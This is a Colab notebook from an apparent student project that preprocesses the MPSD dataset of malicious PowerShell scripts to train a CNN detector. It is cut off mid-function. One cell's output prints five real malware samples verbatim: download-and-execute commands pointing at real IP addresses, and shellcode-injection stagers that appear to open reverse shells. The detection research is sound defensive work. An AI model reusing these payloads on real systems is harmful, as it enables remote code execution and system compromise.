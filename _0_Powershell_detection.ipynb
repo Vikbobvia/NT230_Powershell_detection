{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Vikbobvia/Powershell_detection/blob/main/_0_Powershell_detection.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/das-lab/mpsd.git\n",
        "!git clone https://github.com/mingruimingrui/Convolution-neural-networks-made-easy-with-keras.git\n",
        "import os\n",
        "import random\n",
        "folder_path = \"/content/mpsd/malicious_pure\"\n",
        "import pandas as pd\n",
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "import tensorflow as tf\n",
        "from tensorflow.keras import Sequential\n",
        "from tensorflow.keras.layers import Dense, Conv2D, MaxPooling2D, Dropout, Flatten\n",
        "from tensorflow.keras.datasets import cifar10\n",
        "from tensorflow.keras.utils import to_categorical\n",
        "from matplotlib.ticker import (MultipleLocator, FormatStrFormatter)\n",
        "from dataclasses import dataclass"
      ],
      "metadata": {
        "id": "jINzl7MvWb2F",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "8490431a-34b3-45f8-b933-0cb5c1598b99"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'mpsd'...\n",
            "remote: Enumerating objects: 10421, done.\u001b[K\n",
            "remote: Counting objects: 100% (10421/10421), done.\u001b[K\n",
            "remote: Compressing objects: 100% (9216/9216), done.\u001b[K\n",
            "remote: Total 10421 (delta 1200), reused 10418 (delta 1200), pack-reused 0\u001b[K\n",
            "Receiving objects: 100% (10421/10421), 37.78 MiB | 15.86 MiB/s, done.\n",
            "Resolving deltas: 100% (1200/1200), done.\n",
            "Updating files: 100% (12721/12721), done.\n",
            "Cloning into 'Convolution-neural-networks-made-easy-with-keras'...\n",
            "remote: Enumerating objects: 408, done.\u001b[K\n",
            "remote: Total 408 (delta 0), reused 0 (delta 0), pack-reused 408\u001b[K\n",
            "Receiving objects: 100% (408/408), 28.11 MiB | 26.17 MiB/s, done.\n",
            "Resolving deltas: 100% (243/243), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "def read_psi_files(folder_path):\n",
        "  \"\"\"\n",
        "  Reads all files with the .psi extension in a folder and prints them line by line.\n",
        "\n",
        "  Args:\n",
        "      folder_path: The path to the folder containing the .psi files.\n",
        "  \"\"\"\n",
        "  # Check if folder exists\n",
        "  if not os.path.isdir(folder_path):\n",
        "    print(f\"Error: Folder '{folder_path}' does not exist.\")\n",
        "    return\n",
        "\n",
        "  # Loop through files in the folder\n",
        "  number_loop = 5\n",
        "  index = 0\n",
        "  for filename in os.listdir(folder_path):\n",
        "    if filename.endswith(\".ps1\"):\n",
        "      file_path = os.path.join(folder_path, filename)\n",
        "      # Open the file in read mode\n",
        "      with open(file_path, 'r') as f:\n",
        "        # Read all lines and print them\n",
        "        for line in f:\n",
        "          print(line.strip())\n",
        "    index += 1\n",
        "    if (index >= number_loop) : break\n",
        "\n",
        "# Example usage\n",
        "read_psi_files(folder_path)\n"
      ],
      "metadata": {
        "id": "tnNyecDtdMla",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "3161ede2-6eb4-4c53-c629-c83bde8b4e0f"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',\"$env:APPDATA\\csrsv.exe\");Start-Process (\"$env:APPDATA\\csrsv.exe\")\n",
            "\n",
            "\n",
            "$ipl = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ipl -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x3d,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$LRD3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($LRD3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$LRD3,0,0,0);for (;;){Start-sleep 60};\n",
            "\n",
            "\n",
            "$eh6e = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eh6e -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x56,0x60,0xe7,0xe4,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x45,0x0f,0x03,0x45,0x59,0x82,0x12,0x18,0x8d,0xc0,0xdd,0xe1,0x4d,0xa5,0x54,0x04,0x7c,0xe5,0x03,0x4c,0x2e,0xd5,0x40,0x00,0xc2,0x9e,0x05,0xb1,0x51,0xd2,0x81,0xb6,0xd2,0x59,0xf4,0xf9,0xe3,0xf2,0xc4,0x98,0x67,0x09,0x19,0x7b,0x56,0xc2,0x6c,0x7a,0x9f,0x3f,0x9c,0x2e,0x48,0x4b,0x33,0xdf,0xfd,0x01,0x88,0x54,0x4d,0x87,0x88,0x89,0x05,0xa6,0xb9,0x1f,0x1e,0xf1,0x19,0xa1,0xf3,0x89,0x13,0xb9,0x10,0xb7,0xea,0x32,0xe2,0x43,0xed,0x92,0x3b,0xab,0x42,0xdb,0xf4,0x5e,0x9a,0x1b,0x32,0x81,0xe9,0x55,0x41,0x3c,0xea,0xa1,0x38,0x9a,0x7f,0x32,0x9a,0x69,0x27,0x9e,0x1b,0xbd,0xbe,0x55,0x17,0x0a,0xb4,0x32,0x3b,0x8d,0x19,0x49,0x47,0x06,0x9c,0x9e,0xce,0x5c,0xbb,0x3a,0x8b,0x07,0xa2,0x1b,0x71,0xe9,0xdb,0x7c,0xda,0x56,0x7e,0xf6,0xf6,0x83,0xf3,0x55,0x9e,0x60,0x3e,0x66,0x5e,0xef,0x49,0x15,0x6c,0xb0,0xe1,0xb1,0xdc,0x39,0x2c,0x45,0x23,0x10,0x88,0xd9,0xda,0x9b,0xe9,0xf0,0x18,0xcf,0xb9,0x6a,0x89,0x70,0x52,0x6b,0x36,0xa5,0xcf,0x6e,0xa0,0x2a,0x2d,0xcf,0xb9,0xdb,0x4f,0x2f,0xa8,0x43,0xd9,0xc9,0x9a,0x23,0x89,0x45,0x5a,0x94,0x69,0x36,0x32,0xfe,0x65,0x69,0x22,0x01,0xac,0x02,0xc8,0xee,0x19,0x7a,0x64,0x96,0x03,0xf0,0x15,0x57,0x9e,0x7c,0x15,0xd3,0x2d,0x80,0xdb,0x14,0x5b,0x92,0x8b,0xd4,0x16,0xc8,0x1d,0xea,0x8c,0x67,0xa1,0x7e,0x2b,0x2e,0xf6,0x16,0x31,0x17,0x30,0xb9,0xca,0x72,0x4b,0x70,0x5f,0x3d,0x23,0x7d,0x8f,0xbd,0xb3,0x2b,0xc5,0xbd,0xdb,0x8b,0xbd,0xed,0xfe,0xd3,0x6b,0x82,0x53,0x46,0x94,0xf3,0x00,0xc1,0xfc,0xf9,0x7f,0x25,0xa3,0x02,0xaa,0xb7,0x9f,0xd4,0x92,0xcd,0xf1,0xe4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Otjb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Otjb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Otjb,0,0,0);for (;;){Start-sleep 60};\n",
            "\n",
            "\n",
            "$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0x42,0x21,0x1b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\n",
            "\n",
            "\n",
            "(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',\"$env:APPDATA\\csrsv.exe\");Start-Process (\"$env:APPDATA\\csrsv.exe\")\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import base64\n",
        "import os\n",
        "\n",
        "def check_for_base64_encoded_powershell(file_path):\n",
        "    \"\"\"Checks if a file contains potential Base64-encoded PowerShell commands.\"\"\"\n",
        "    with open(file_path, 'r') as file:\n",
        "        for line in file:\n",
        "            if line.lower().startswith(('-e', '-E')):\n",
        "                    print(f\"Potential PowerShell command found (starts with -e or -E): {file_path}\")\n",
        "                    return True\n",
        "            try:\n",
        "                # Attempt to decode the line as Base64\n",
        "                decoded_bytes = base64.b64decode(line)\n",
        "                decoded_text = decoded_bytes.decode('utf-8')\n",
        "\n",
        "                # Check for common PowerShell keywords in the decoded text\n",
        "                if \"powershell\" in decoded_text.lower():\n",
        "                    # Potential Base64-encoded PowerShell command found\n",
        "                    return True\n",
        "\n",
        "\n",
        "\n",
        "            except Exception:\n",
        "                # Not a valid Base64 string, continue to the next line\n",
        "                pass\n",
        "\n",
        "    return False\n",
        "\n",
        "def count_encoded_files(folder_path):\n",
        "    \"\"\"Counts the number of files containing potential Base64-encoded PowerShell commands.\"\"\"\n",
        "    encoded_file_count = 0\n",
        "    for root, _, files in os.walk(folder_path):\n",
        "        for filename in files:\n",
        "            file_path = os.path.join(root, filename)\n",
        "            if check_for_base64_encoded_powershell(file_path):\n",
        "                encoded_file_count += 1\n",
        "                print(f\"Potential Base64-encoded PowerShell found in: {file_path}\")\n",
        "\n",
        "    return encoded_file_count\n",
        "\n"
      ],
      "metadata": {
        "id": "S2cPGLT0bcHE"
      },
      "execution_count": 3,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "encoded_file_count = count_encoded_files(folder_path)\n",
        "print(f\"Total number of potential Base64-encoded PowerShell files: {encoded_file_count}\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "OdqYpPuWfuwT",
        "outputId": "71a7469c-dfe0-4fed-bed9-96801ac52199"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Total number of potential Base64-encoded PowerShell files: 0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "def Create_folder (folder_path):\n",
        "  folder_path = folder_path\n",
        "  os.makedirs(folder_path, exist_ok=True)"
      ],
      "metadata": {
        "id": "hSqvRZvg4TAk"
      },
      "execution_count": 5,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "folder_path_preproccess = '/content/preproccessed'\n",
        "Create_folder(folder_path_preproccess)\n",
        "folder_path_cache = '/content/preproccessed/cache'\n",
        "Create_folder(folder_path_cache)\n",
        "folder_path_preproccess_malicious = '/content/preproccessed/malicious_pure_preproccessed'\n",
        "Create_folder(folder_path_preproccess_malicious)\n",
        "cache_file_path = '/content/preproccessed/cache/cache.ps1'\n",
        "\n"
      ],
      "metadata": {
        "id": "BbXP7nSd4HgF"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#Main proccessing file\n",
        "\n",
        "import re\n",
        "import binascii\n",
        "\n",
        "def get_file_content_and_replace_number(filename):\n",
        "  \"\"\"\n",
        "  This function reads the content of a text file and stores it in a variable.\n",
        "\n",
        "  Args:\n",
        "      filename: The path to the text file.\n",
        "\n",
        "  Returns:\n",
        "      A string containing the file content, or None if there's an error.\n",
        "  \"\"\"\n",
        "\n",
        "\n",
        "  try:\n",
        "    with open(filename, 'r') as f:\n",
        "      content = f.read()\n",
        "      #number to *\n",
        "      str_text = re.sub(r'\\d+', '*', content)\n",
        "      str_text = re.sub(r'\\s+', ' ', str_text)\n",
        "      # print(str_text)\n",
        "    with open(filename, 'w') as f:\n",
        "      f.write(str_text)\n",
        "      return str_text\n",
        "  except FileNotFoundError:\n",
        "    print(f\"Error: File not found - {filename}\")\n",
        "    return None\n",
        "\n",
        "def Process_file (file_path):\n",
        "    get_file_content_and_replace_number(file_path)\n",
        "    return\n"
      ],
      "metadata": {
        "id": "Su2UyoWP4iRq"
      },
      "execution_count": 7,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#Edit file functions\n",
        "\n",
        "\n",
        "def Copy_file ( source_file_path, dest_file_path):\n",
        "  # Source and destination file paths\n",
        "  source_file_path = source_file_path  # Change this to your source file path\n",
        "  destination_file_path = dest_file_path  # Change this to your destination file path\n",
        "\n",
        "  # Copying the file using the cp command\n",
        "  !cp {source_file_path} {destination_file_path}\n",
        "\n",
        "  print(f'File copied from {source_file_path} to {destination_file_path}')\n",
        "\n",
        "\n",
        "def Delete_file (file_path):\n",
        "  file_path = file_path\n",
        "  os.remove(file_path)\n",
        "  print(f'File at {file_path} has been deleted')\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "def Save_file (file_path, folder_path, new_name):\n",
        "  # Define the folder path and file path\n",
        "  file_path = file_path  # Define the full file path\n",
        "  folder_path = folder_path  # Change this to the folder path where you want to save the file\n",
        "  new_name = new_name\n",
        "  new_file_path = os.path.join(folder_path, new_name)\n",
        "\n",
        "  # Step 2: Create the folder if it does not exist\n",
        "  if not os.path.exists(folder_path):\n",
        "      os.makedirs(folder_path)\n",
        "\n",
        "  # Step 3: Write the content to the file\n",
        "  Copy_file(file_path, new_file_path)\n",
        "\n",
        "\n",
        "\n",
        "def Get_proccessed_file_name (file_path):\n",
        "    file_path = file_path\n",
        "    file_name = os.path.basename(file_path)\n",
        "    new_file_name = file_name.replace('.ps1', '_preprocessed.ps1')\n",
        "    return new_file_name\n"
      ],
      "metadata": {
        "id": "aTcu6sn7kDEY"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#Edit Cache_file\n",
        "\n",
        "def Cache_file (file_path):\n",
        "  Copy_file(file_path, cache_file_path)\n",
        "\n",
        "\n",
        "def Process_cache_file():\n",
        "  Process_file(cache_file_path)\n",
        "\n",
        "\n",
        "\n",
        "def Save_cache_file_to_folder_with_original_file_path(folder_path, original_file_path):\n",
        "  new_name = Get_proccessed_file_name(original_file_path)\n",
        "  Save_file(cache_file_path, folder_path, new_name)\n",
        "\n",
        "\n",
        "\n",
        "def Delete_cache_file ():\n",
        "  try :\n",
        "   Delete_file(cache_file_path)\n",
        "\n",
        "  except FileNotFoundError:\n",
        "    # This block will execute if the file is not found\n",
        "    print(f'Error: The file at {file_path} was not found.')\n",
        "\n"
      ],
      "metadata": {
        "id": "ZROdSg5sEa31"
      },
      "execution_count": 9,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# file_path = '/content/mpsd/malicious_pure/1.ps1'\n",
        "# new_folder_path = \"/content/preproccessed/malicious_pure_preproccessed\"\n",
        "# Cache_file(file_path)\n",
        "# Process_cache_file()\n",
        "# Save_cache_file_to_folder_with_original_file_path(new_folder_path, file_path)\n",
        "# Delete_cache_file()\n"
      ],
      "metadata": {
        "id": "psoH4Wcj0yNa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "\n",
        "def count_files(directory):\n",
        "    count = 0\n",
        "    for root, _, files in os.walk(directory):\n",
        "        count += len(files)\n",
        "    return count\n",
        "\n",
        "# Replace 'path_to_your_folder' with the path to the folder you want to count files in\n",
        "folder_path = '/content/mpsd/malicious_pure'\n",
        "file_count = count_files(folder_path)\n",
        "print(\"Number of files in the folder:\", file_count)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "n-OEdxkGRWRP",
        "outputId": "02350a36-a9c7-4cff-9d6a-bf9f8bd07acd"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Number of files in the folder: 4202\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "def Process_a_file(file_path, new_folder_path):\n",
        "    Cache_file(file_path)\n",
        "    Process_cache_file()\n",
        "    Save_cache_file_to_folder_with_original_file_path(new_folder_path, file_path)\n",
        "    Delete_cache_file()\n",
        "\n",
        "\n",
        "\n",
        "def Process_all_of_folder(folder_path, new_folder_path):\n",
        "   for root, _, files in os.walk(folder_path):\n",
        "        for file in files:\n",
        "            file_path = (os.path.join(root, file))\n",
        "            Process_a_file(file_path, new_folder_path)\n",
        "\n",
        "\n",
        "\n",
        "def Create_all_Process_folder (unprocessed_folder_path, preproccessed_folder_path):\n",
        "    folders = []\n",
        "    for item in os.listdir(unprocessed_folder_path):\n",
        "        # Check if the item is a directory\n",
        "        if os.path.isdir(os.path.join(unprocessed_folder_path, item)) and not item.startswith('.'):\n",
        "          item = item + \"_preproccessed\"\n",
        "          folders.append(item)\n",
        "\n",
        "    for item in folders:\n",
        "        print(item)\n",
        "\n",
        "    try:\n",
        "      for item in folders:\n",
        "          new_folder_path = os.path.join(preproccessed_folder_path, item)\n",
        "          # Check if the folder already exists\n",
        "          if not os.path.exists(new_folder_path):\n",
        "              # If it doesn't exist, create the folder\n",
        "              os.makedirs(new_folder_path)\n",
        "              print(\"Folder created at\", new_folder_path)\n",
        "\n",
        "          else:\n",
        "              print(\"Folder already exists at\", new_folder_path)\n",
        "\n",
        "    except Exception as e:\n",
        "          print(\"Error:\", e)\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "#Run this code to process all\n",
        "def Process_mpsd(unprocessed_folder_path, preproccessed_folder_path):\n",
        "      Create_all_Process_folder(unprocessed_folder_path, preproccessed_folder_path)\n",
        "      for item in os.listdir(unprocessed_folder_path):\n",
        "        X_folder_path = os.path.join(unprocessed_folder_path ,item)\n",
        "        item = item + \"_preproccessed\"\n",
        "        Y_folder_path = os.path.join(preproccessed_folder_path , item)\n",
        "\n",
        "\n",
        "\n",
        "        if os.path.isdir(X_folder_path ) and os.path.isdir (Y_folder_path) and len(os.listdir(Y_folder_path)) == 0  :\n",
        "          print(\"X_folder_path = \", X_folder_path )\n",
        "          print(\"Y_folder_path = \", Y_folder_path  )\n",
        "          Process_all_of_folder(X_folder_path, Y_folder_path)\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "GrFj13el35Wg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "/------------------------------------/"
      ],
      "metadata": {
        "id": "DgPu_tJWs_xi"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "Create_folder(\"/content/test\")\n",
        "Process_a_file ( \"/content/mpsd/malicious_pure/1.ps1\", \"/content/test/\")\n",
        "Process_a_file ( \"/content/mpsd/malicious_pure/10.ps1\", \"/content/test/\")\n",
        "Process_a_file ( \"/content/mpsd/malicious_pure/100.ps1\", \"/content/test/\")\n",
        "Process_a_file ( \"/content/mpsd/malicious_pure/1000.ps1\", \"/content/test/\")\n",
        "Process_a_file ( \"/content/mpsd/malicious_pure/1001.ps1\", \"/content/test/\")\n",
        "Process_a_file ( \"/content/mpsd/malicious_pure/1002.ps1\", \"/content/test/\")"
      ],
      "metadata": {
        "id": "LI28rLLj1xyt",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ed76b86f-c1be-4639-f3c6-c947727ab1cb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "File copied from /content/mpsd/malicious_pure/1.ps1 to /content/preproccessed/cache/cache.ps1\n",
            "File copied from /content/preproccessed/cache/cache.ps1 to /content/test/1_preprocessed.ps1\n",
            "File at /content/preproccessed/cache/cache.ps1 has been deleted\n",
            "File copied from /content/mpsd/malicious_pure/10.ps1 to /content/preproccessed/cache/cache.ps1\n",
            "File copied from /content/preproccessed/cache/cache.ps1 to /content/test/10_preprocessed.ps1\n",
            "File at /content/preproccessed/cache/cache.ps1 has been deleted\n",
            "File copied from /content/mpsd/malicious_pure/100.ps1 to /content/preproccessed/cache/cache.ps1\n",
            "File copied from /content/preproccessed/cache/cache.ps1 to /content/test/100_preprocessed.ps1\n",
            "File at /content/preproccessed/cache/cache.ps1 has been deleted\n",
            "File copied from /content/mpsd/malicious_pure/1000.ps1 to /content/preproccessed/cache/cache.ps1\n",
            "File copied from /content/preproccessed/cache/cache.ps1 to /content/test/1000_preprocessed.ps1\n",
            "File at /content/preproccessed/cache/cache.ps1 has been deleted\n",
            "File copied from /content/mpsd/malicious_pure/1001.ps1 to /content/preproccessed/cache/cache.ps1\n",
            "File copied from /content/preproccessed/cache/cache.ps1 to /content/test/1001_preprocessed.ps1\n",
            "File at /content/preproccessed/cache/cache.ps1 has been deleted\n",
            "File copied from /content/mpsd/malicious_pure/1002.ps1 to /content/preproccessed/cache/cache.ps1\n",
            "File copied from /content/preproccessed/cache/cache.ps1 to /content/test/1002_preprocessed.ps1\n",
            "File at /content/preproccessed/cache/cache.ps1 has been deleted\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "alphabet = list ('abcdefghijklmnopqrstuvwxyz \"')\n",
        "alphabet1 = list (\"-!%&()*,./`:;?@[\\]{|}+<=>^#$~'”\")\n",
        "alphabet.extend(alphabet1)\n",
        "\n",
        "\n",
        "def encode_character_df(df):\n",
        "  \"\"\"\n",
        "  Encodes a DataFrame with characters in each row to have alphabet columns.\n",
        "\n",
        "  Args:\n",
        "      df (pandas.DataFrame): The DataFrame to encode.\n",
        "\n",
        "  Returns:\n",
        "      pandas.DataFrame: The encoded DataFrame with alphabet columns.\n",
        "  \"\"\"\n",
        "  # Initialize an empty DataFrame with alphabet columns\n",
        "  encoded_df = pd.DataFrame(columns=alphabet)\n",
        "\n",
        "  # Loop through each row (character) in the original DataFrame\n",
        "  for index, row in df.iterrows():\n",
        "    char = row.iloc[0]  # Get the character from the row\n",
        "    # Create a one-hot encoded Series with 1 for the character's column\n",
        "    encoded_series = pd.Series(0, index=alphabet)\n",
        "    encoded_series.loc[char] = 1\n",
        "    # Add the encoded Series as a new row in the encoded DataFrame\n",
        "    encoded_df = encoded_df._append(encoded_series, ignore_index=True)\n",
        "\n",
        "  return encoded_df\n",
        "\n",
        "\n",
        "def is_uppercase(char):\n",
        "    return int(char.isupper())\n",
        "\n",
        "\n",
        "def add_zeros_to_dataframe(df, target_rows=1024):\n",
        "  \"\"\"\n",
        "  Adds a row of zeros to a DataFrame if it has fewer than the target number of rows.\n",
        "\n",
        "  Args:\n",
        "      df (pandas.DataFrame): The DataFrame to modify.\n",
        "      target_rows (int, optional): The desired number of rows in the DataFrame. Defaults to 1024.\n",
        "\n",
        "  Returns:\n",
        "      pandas.DataFrame: The modified DataFrame with the added row(s) of zeros.\n",
        "  \"\"\"\n",
        "\n",
        "  if df.shape[0] >= target_rows:\n",
        "    return df  # No need to add rows if already at or exceeding target\n",
        "\n",
        "  # Calculate the number of rows to add\n",
        "  num_rows_to_add = target_rows - df.shape[0]\n",
        "\n",
